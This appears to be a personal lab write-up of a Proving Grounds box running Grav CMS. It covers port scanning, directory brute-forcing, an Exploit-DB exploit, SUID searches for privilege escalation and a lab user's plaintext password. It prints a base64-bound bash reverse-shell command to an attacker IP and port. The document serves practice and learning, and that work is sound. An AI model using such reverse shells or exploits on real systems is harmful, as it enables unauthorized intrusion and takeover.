# NMAP 

```
sudo nmap -sC -sV 192.168.247.12 -oN nmap-astronaut
```

![[PG/Linux/attachments/Pasted image 20250705153301.png]]

All ports



# Web 

![[PG/Linux/attachments/Pasted image 20250705153357.png]]
- a folder

Which leads to.. a grav-site!

![[PG/Linux/attachments/Pasted image 20250705153458.png]]

This CMS has a lot of intriguing vulns. Not sure which version I have. 

Doing feroxbuster and found a login page 

```
feroxbuster -u http://192.168.247.12/grav-admin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

![[PG/Linux/attachments/Pasted image 20250705155002.png]]
- if this isn't admin:admin imma be pissed.

It failed 😭
![[PG/Linux/attachments/Pasted image 20250705155054.png]]

Looking for exploits ... https://www.exploit-db.com/exploits/49973?source=post_page-----09c2cf63de97---------------------------------------

Try this.

Make some changes

```
echo -ne "bash -i >& /dev/tcp/192.168.45.152/9001 0>&1" | base64 -w0
```

![[PG/Linux/attachments/Pasted image 20250705162416.png]]

This shit ain't working. fml

Whatevs. This should result in initial access

Oh jk. after a decade this shell came back. 

![[PG/Linux/attachments/Pasted image 20250705164436.png]]
# Priv Esc 

SUID and GTFO bins thing.
```
find / -perm -u=s -type f 2>/dev/null
```

or 

```
find / -perm -4000 2>/dev/null
```


![[PG/Linux/attachments/Pasted image 20250705170251.png]]

It doesn't look like my box has that php shit wtf. DUMMMMBBBBBBBBB

Remember that I have creds lol 

```
alex / thebestsysadmin@13231
```

switch to alex user

Now run 

![[PG/Linux/attachments/Pasted image 20250705171359.png]]
